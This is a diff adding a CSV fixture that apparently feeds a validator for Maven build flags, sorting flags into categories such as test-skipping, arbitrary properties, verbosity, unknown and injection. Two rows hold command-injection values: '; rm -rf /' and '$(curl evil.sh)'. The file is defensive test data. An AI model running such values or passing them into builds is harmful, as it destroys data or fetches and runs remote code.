@@ -1,0 +1,15 @@
+flag,category
+-DskipTests,defeat-the-verb
+-Dmaven.test.skip=true,defeat-the-verb
+-Dmaven.repo.local=/tmp/evil,arbitrary-D
+-Dfoo=bar,arbitrary-D
+-X,stdout-verbosity
+-q,stdout-verbosity
+--quiet,stdout-verbosity
+--debug,stdout-verbosity
+-Dtest=OnlyMine,selection-not-a-free-flag
+-pl,selection-not-a-free-flag
+; rm -rf /,injection
+$(curl evil.sh),injection
+--not-a-real-flag,unknown
+-Z,unknown
